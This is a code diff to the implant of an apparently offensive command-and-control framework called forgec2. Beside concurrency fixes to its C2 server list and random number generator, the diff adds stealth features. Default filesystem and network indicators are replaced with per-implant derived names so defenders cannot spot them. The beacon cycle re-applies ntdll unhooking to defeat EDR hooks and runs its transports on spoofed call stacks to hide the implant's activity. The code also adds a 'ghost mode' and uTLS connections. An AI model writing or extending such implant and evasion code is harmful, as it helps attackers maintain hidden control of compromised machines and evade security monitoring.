@@ -8,7 +8,6 @@ import (
 	"crypto/hmac"
 	"crypto/rand"
 	"crypto/sha256"
-	"crypto/tls"
 	"encoding/base64"
 	"encoding/binary"
 	"encoding/hex"
@@ -26,6 +25,7 @@ import (
 	"runtime"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/forgec2/forgec2/pkg/encoding"
@@ -42,11 +42,49 @@ func decodeBeacon(data []byte, v any) error {
 	return encoding.Unmarshal(data, v)
 }
 
-func newCryptoRand() *mathRand.Rand {
+// lockedRand is a mutex-guarded *mathRand.Rand. The agent reads/writes rng from
+// several goroutines concurrently (beacon sender, screenshot stream, injection,
+// scheduler, sleep variator), and *mathRand.Rand is not safe for concurrent use.
+type lockedRand struct {
+	mu sync.Mutex
+	r  *mathRand.Rand
+}
+
+func (l *lockedRand) Intn(n int) int {
+	l.mu.Lock()
+	defer l.mu.Unlock()
+	return l.r.Intn(n)
+}
+
+func (l *lockedRand) Int63n(n int64) int64 {
+	l.mu.Lock()
+	defer l.mu.Unlock()
+	return l.r.Int63n(n)
+}
+
+func (l *lockedRand) Float64() float64 {
+	l.mu.Lock()
+	defer l.mu.Unlock()
+	return l.r.Float64()
+}
+
+func (l *lockedRand) Uint32() uint32 {
+	l.mu.Lock()
+	defer l.mu.Unlock()
+	return l.r.Uint32()
+}
+
+func (l *lockedRand) Uint64() uint64 {
+	l.mu.Lock()
+	defer l.mu.Unlock()
+	return l.r.Uint64()
+}
+
+func newCryptoRand() *lockedRand {
 	seed := make([]byte, 8)
 	rand.Read(seed)
 	src := mathRand.NewSource(int64(binary.LittleEndian.Uint64(seed)))
-	return mathRand.New(src)
+	return &lockedRand{r: mathRand.New(src)}
 }
 
 func init() {
@@ -95,17 +133,17 @@ func init() {
 	// Parse injected string values ( -X only supports string )
 	// Multi-C2 failover: comma-separated URLs in C2URL
 	parts := strings.Split(C2URL, ",")
-	C2URLs = make([]string, 0, len(parts))
+	urls := make([]string, 0, len(parts))
 	for _, p := range parts {
 		p = strings.TrimSpace(p)
 		if p != "" {
-			C2URLs = append(C2URLs, p)
+			urls = append(urls, p)
 		}
 	}
-	if len(C2URLs) == 0 {
-		C2URLs = []string{C2URL}
+	if len(urls) == 0 {
+		urls = []string{C2URL}
 	}
-	currentC2Idx = 0
+	c2URLsStore(urls, 0)
 	var err error
 	Interval, err = strconv.Atoi(IntervalStr)
 	if err != nil || Interval < 1 {
@@ -156,6 +194,11 @@ func init() {
 	evasionEnabled = strings.ToLower(EvasionStr) == "true" || EvasionStr == "1"
 	if v := os.Getenv("FORGEC2_EVASION"); v == "1" || strings.ToLower(v) == "true" {
 		evasionEnabled = true
+	}
+
+	ghostModeEnabled = strings.ToLower(GhostModeStr) == "true" || GhostModeStr == "1"
+	if v := os.Getenv("FORGEC2_GHOST_MODE"); v == "1" || strings.ToLower(v) == "true" {
+		ghostModeEnabled = true
 	}
 
 	// Adaptive EDR detection: detect running EDR and apply optimal evasion strategy
@@ -211,6 +254,16 @@ func init() {
 	}
 	if v := os.Getenv("FORGEC2_PERSIST_PREFIX"); v != "" {
 		persistencePrefix = v
+	}
+
+	// Derive transport artifact names from the (operator-controlled) persistence
+	// prefix so the compiled implant never ships the literal "forgec2" as a pipe
+	// name or SSH username — those are trivial network/process IOCs.
+	if SMBPipeName == "" {
+		SMBPipeName = persistencePrefix
+	}
+	if SSHUserStr == "" {
+		SSHUserStr = persistencePrefix
 	}
 
 	// Certificate pinning
@@ -694,9 +747,46 @@ func getUUIDFilePath() string {
 			base = "."
 		}
 	}
-	dir := filepath.Join(base, ".forgec2")
+	dir := agentStateDir(base)
 	_ = os.MkdirAll(dir, 0o700)
 	return filepath.Join(dir, "agent.uuid")
+}
+
+// agentStateDir returns a per-implant, non-default data directory name. The
+// static ".forgec2" name is a trivial filesystem IOC; instead we derive a
+// stable, unpredictable directory from the injected registration secret (or,
+// as a fallback, other compile-time injected constants) so different implants
+// use different directory names while remaining stable across restarts.
+func agentStateDir(base string) string {
+	seed := RegSecretStr
+	if seed == "" {
+		seed = C2URL + UserAgent + BeaconURI
+	}
+	sum := sha256.Sum256([]byte(seed))
+	return filepath.Join(base, "."+hex.EncodeToString(sum[:])[:12])
+}
+
+// sanitizeLabel returns a filesystem/label-safe identifier derived from s by
+// replacing any run of characters outside [A-Za-z0-9._-] with a single dot. It
+// is used to turn the operator-controlled persistence prefix into valid plist
+// labels, .desktop filenames and systemd unit names without shipping "forgec2".
+func sanitizeLabel(s string) string {
+	var b strings.Builder
+	prevDot := false
+	for _, r := range s {
+		if (r >= 'A' && r <= 'Z') || (r >= 'a' && r <= 'z') || (r >= '0' && r <= '9') || r == '.' || r == '_' || r == '-' {
+			b.WriteRune(r)
+			prevDot = false
+		} else if !prevDot {
+			b.WriteRune('.')
+			prevDot = true
+		}
+	}
+	out := b.String()
+	if out == "" || out == "." {
+		out = "agent"
+	}
+	return out
 }
 
 // getBeaconStateFilePath returns the persistence path for v2 protocol state
@@ -746,17 +836,17 @@ func persistBeaconState() {
 // and is intentionally left untouched.
 func reparseNetworkConfig() {
 	parts := strings.Split(C2URL, ",")
-	C2URLs = make([]string, 0, len(parts))
+	urls := make([]string, 0, len(parts))
 	for _, p := range parts {
 		p = strings.TrimSpace(p)
 		if p != "" {
-			C2URLs = append(C2URLs, p)
+			urls = append(urls, p)
 		}
 	}
-	if len(C2URLs) == 0 {
-		C2URLs = []string{C2URL}
+	if len(urls) == 0 {
+		urls = []string{C2URL}
 	}
-	currentC2Idx = 0
+	c2URLsStore(urls, 0)
 	var err error
 	Interval, err = strconv.Atoi(IntervalStr)
 	if err != nil || Interval < 1 {
@@ -805,6 +895,9 @@ func startTaskWorker() {
 		go func() {
 			for task := range taskQueue {
 				result := executeTask(task)
+				if task.Key != "" {
+					applyTaskKeyEncryption(task.Key, &result)
+				}
 				ensureResultID(&result)
 				enqueueResult(result)
 				inFastMode.Store(true)
@@ -869,6 +962,11 @@ func availableTaskCapacity() int {
 }
 
 func doBeacon() {
+	// Continuously defeat EDRs that re-instrument ntdll between beacons by
+	// re-applying the clean .text from disk each cycle (no-op until an operator
+	// enables unhooking via the unhook_ntdll task).
+	reapplyNtdllUnhook()
+
 	info := getSystemInfo()
 
 	// Collect pending SOCKS relay data
@@ -963,45 +1061,58 @@ func doBeacon() {
 	// Apply traffic shape analysis and adaptation
 	sendBody = applyTrafficShaping(sendBody)
 
-	// P2P child mode: beacon through parent instead of server
+	// P2P child mode: beacon through parent instead of server. The whole
+	// transport dispatch runs on a (Windows) native thread with a spoofed
+	// call stack when useStackSpoofing is active, hiding the implant's Go
+	// routines from userland stack-walk based EDR attribution.
 	var respBody []byte
-	if P2PParent != "" {
-		respBody = sendP2PBeacon(sendBody)
-	} else if Protocol == "smb" || BeaconTransport == "smb" {
-		respBody = sendSMBBeacon(sendBody)
-	} else if Protocol == "tcp" {
-		respBody = sendTCPBeacon(sendBody)
-	} else if Protocol == "dns" {
-		respBody = sendDNSBeacon(sendBody)
-		if respBody == nil {
-			dnsConsecutiveFailures++
-			if Debug {
-				fmt.Printf("[!] DNS beacon failed (%d/%d consecutive failures)\n", dnsConsecutiveFailures, dnsFallbackThreshold)
-			}
-			if dnsConsecutiveFailures >= dnsFallbackThreshold {
+	runBeaconSendSpoofed(func() {
+		switch {
+		case P2PParent != "":
+			respBody = sendP2PBeacon(sendBody)
+		case Protocol == "smb" || BeaconTransport == "smb":
+			respBody = sendSMBBeacon(sendBody)
+		case Protocol == "tcp":
+			respBody = sendTCPBeacon(sendBody)
+		case Protocol == "dns":
+			respBody = sendDNSBeacon(sendBody)
+			if respBody == nil {
+				dnsConsecutiveFailures++
 				if Debug {
-					fmt.Println("[!] DNS failure threshold reached, falling back to HTTP")
+					fmt.Printf("[!] DNS beacon failed (%d/%d consecutive failures)\n", dnsConsecutiveFailures, dnsFallbackThreshold)
 				}
-				Protocol = "http"
-				respBody = sendWithMode(sendBody)
+				if dnsConsecutiveFailures >= dnsFallbackThreshold {
+					if Debug {
+						fmt.Println("[!] DNS failure threshold reached, falling back to HTTP")
+					}
+					Protocol = "http"
+					respBody = sendWithMode(sendBody)
+				}
+			} else {
+				dnsConsecutiveFailures = 0
 			}
-		} else {
-			dnsConsecutiveFailures = 0
+		case Protocol == "icmp":
+			respBody = sendICMPBeacon(sendBody)
+		case Protocol == "udp":
+			respBody = sendUDPBeacon(sendBody)
+		case BeaconTransport == "wss":
+			respBody = sendWSSBeacon(sendBody)
+		case BeaconTransport == "grpc" || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "grpc://") || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "grpcs://"):
+			respBody = sendGRPCBeacon(sendBody)
+		case BeaconTransport == "ssh" || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "ssh://"):
+			respBody = sendSSHBeacon(sendBody)
+		case BeaconTransport == "mtls" || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "mtls://"):
+			respBody = sendMTLSBeacon(sendBody)
+		case BeaconTransport == "h2c" || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "h2c://"):
+			respBody = sendH2CBeacon(sendBody)
+		default:
+			respBody = sendWithMode(sendBody)
 		}
-	} else if Protocol == "icmp" {
-		respBody = sendICMPBeacon(sendBody)
-	} else if BeaconTransport == "wss" {
-		respBody = sendWSSBeacon(sendBody)
-	} else if BeaconTransport == "grpc" || strings.HasPrefix(C2URLs[currentC2Idx], "grpc://") || strings.HasPrefix(C2URLs[currentC2Idx], "grpcs://") {
-		respBody = sendGRPCBeacon(sendBody)
-	} else if BeaconTransport == "ssh" || strings.HasPrefix(C2URLs[currentC2Idx], "ssh://") {
-		respBody = sendSSHBeacon(sendBody)
-	} else if BeaconTransport == "mtls" || strings.HasPrefix(C2URLs[currentC2Idx], "mtls://") {
-		respBody = sendMTLSBeacon(sendBody)
-	} else if BeaconTransport == "h2c" || strings.HasPrefix(C2URLs[currentC2Idx], "h2c://") {
-		respBody = sendH2CBeacon(sendBody)
+	})
+	if respBody != nil {
+		noteTransportSuccess()
 	} else {
-		respBody = sendWithMode(sendBody)
+		maybeRotateTransport()
 	}
 	if respBody == nil {
 		pendingMu.Lock()
@@ -1075,9 +1186,18 @@ func doBeacon() {
 		// per-implant secret). The response MAC already authenticated the frame,
 		// so the config is trustworthy.
 		applyServerNetworkConfig(authResp.NetworkConfig)
-		if err := ecdhSess.establishFromServerKey(authResp.ECDHPub); err != nil {
+		// On registration the server derived its session from our identity key
+		// (the register frame carries IdentityPub); on a handshake it used the
+		// ephemeral key we presented. Derive our side with the matching key.
+		var sessErr error
+		if authResp.RegOK {
+			sessErr = ecdhSess.establishRegisteredFromServerKey(authResp.ECDHPub)
+		} else {
+			sessErr = ecdhSess.establishFromServerKey(authResp.ECDHPub)
+		}
+		if sessErr != nil {
 			if Debug {
-				log.Printf("[!] ECDH handshake completion failed: %v", err)
+				log.Printf("[!] ECDH handshake completion failed: %v", sessErr)
 			}
 			return
 		}
@@ -1185,11 +1305,49 @@ func doBeacon() {
 	}
 }
 
+// c2URLsSnapshot returns a stable snapshot of the C2 URL list. The slice is
+// never mutated after being published via c2URLsStore, so callers may iterate
+// it without locking. Reading the old C2URLs slice directly (with a separate
+// currentC2Idx) allowed an index-out-of-range panic when the list was replaced
+// concurrently (e.g. on profile rotate) while another goroutine indexed it.
+func c2URLsSnapshot() []string {
+	if v := c2URLsAtomic.Load(); v != nil {
+		return v.([]string)
+	}
+	return nil
+}
+
+// c2URLsStore publishes a new C2 URL list together with the index of the last
+// working server, atomically, so readers can never observe a slice/idx mismatch.
+func c2URLsStore(urls []string, idx int32) {
+	if len(urls) == 0 {
+		idx = 0
+	} else if idx < 0 || idx >= int32(len(urls)) {
+		idx = 0
+	}
+	c2URLsAtomic.Store(urls)
+	currentC2Idx.Store(idx)
+}
+
+// c2URLAtIndex returns the C2 URL at i, clamped to the current list length so a
+// stale index hint can never panic.
+func c2URLAtIndex(i int) string {
+	urls := c2URLsSnapshot()
+	if len(urls) == 0 {
+		return ""
+	}
+	if i < 0 || i >= len(urls) {
+		i = 0
+	}
+	return urls[i]
+}
+
 func sendToC2(idx int, body []byte) []byte {
-	if idx < 0 || idx >= len(C2URLs) {
+	urls := c2URLsSnapshot()
+	if idx < 0 || idx >= len(urls) {
 		return nil
 	}
-	url := C2URLs[idx]
+	url := urls[idx]
 
 	beaconURI := getActiveBeaconURIFromConfig()
 	if ContentLengthJitter > 0 {
@@ -1332,12 +1490,13 @@ func wrapMalleableRequest(body []byte) []byte {
 }
 
 func sendBeacon(body []byte) []byte {
-	startIdx := currentC2Idx
-	for i := 0; i < len(C2URLs); i++ {
-		idx := (startIdx + i) % len(C2URLs)
+	startIdx := int(currentC2Idx.Load())
+	urls := c2URLsSnapshot()
+	for i := 0; i < len(urls); i++ {
+		idx := (startIdx + i) % len(urls)
 		data := sendToC2(idx, body)
 		if data != nil {
-			currentC2Idx = idx
+			currentC2Idx.Store(int32(idx))
 			return data
 		}
 	}
@@ -1356,8 +1515,7 @@ func sendTCPBeacon(body []byte) []byte {
 	// Basic TLS support when SkipTLSVerify or using tls:// scheme
 	useTLS := SkipTLSVerify || strings.HasPrefix(C2URL, "tls://")
 	if useTLS {
-		tlsCfg := newAgentTLSConfig(DomainFront)
-		conn, err = tls.Dial("tcp", addr, tlsCfg)
+		conn, err = dialUTLSTCP("tcp", addr)
 	} else {
 		conn, err = net.Dial("tcp", addr)
 	}
@@ -1577,13 +1735,13 @@ func sendTaskResult(res TaskResult) {
 		sendSMBBeacon(sendBody)
 	} else if BeaconTransport == "wss" {
 		sendWSSBeacon(sendBody)
-	} else if BeaconTransport == "ssh" || strings.HasPrefix(C2URLs[currentC2Idx], "ssh://") {
+	} else if BeaconTransport == "ssh" || strings.HasPrefix(	c2URLAtIndex(int(currentC2Idx.Load())), "ssh://") {
 		sendSSHBeacon(sendBody)
-	} else if BeaconTransport == "mtls" || strings.HasPrefix(C2URLs[currentC2Idx], "mtls://") {
+	} else if BeaconTransport == "mtls" || strings.HasPrefix(	c2URLAtIndex(int(currentC2Idx.Load())), "mtls://") {
 		sendMTLSBeacon(sendBody)
-	} else if BeaconTransport == "h2c" || strings.HasPrefix(C2URLs[currentC2Idx], "h2c://") {
+	} else if BeaconTransport == "h2c" || strings.HasPrefix(	c2URLAtIndex(int(currentC2Idx.Load())), "h2c://") {
 		sendH2CBeacon(sendBody)
-	} else if BeaconTransport == "grpc" || strings.HasPrefix(C2URLs[currentC2Idx], "grpc://") || strings.HasPrefix(C2URLs[currentC2Idx], "grpcs://") {
+	} else if BeaconTransport == "grpc" || strings.HasPrefix(	c2URLAtIndex(int(currentC2Idx.Load())), "grpc://") || strings.HasPrefix(	c2URLAtIndex(int(currentC2Idx.Load())), "grpcs://") {
 		sendGRPCBeacon(sendBody)
 	} else {
 		sendBeacon(sendBody)
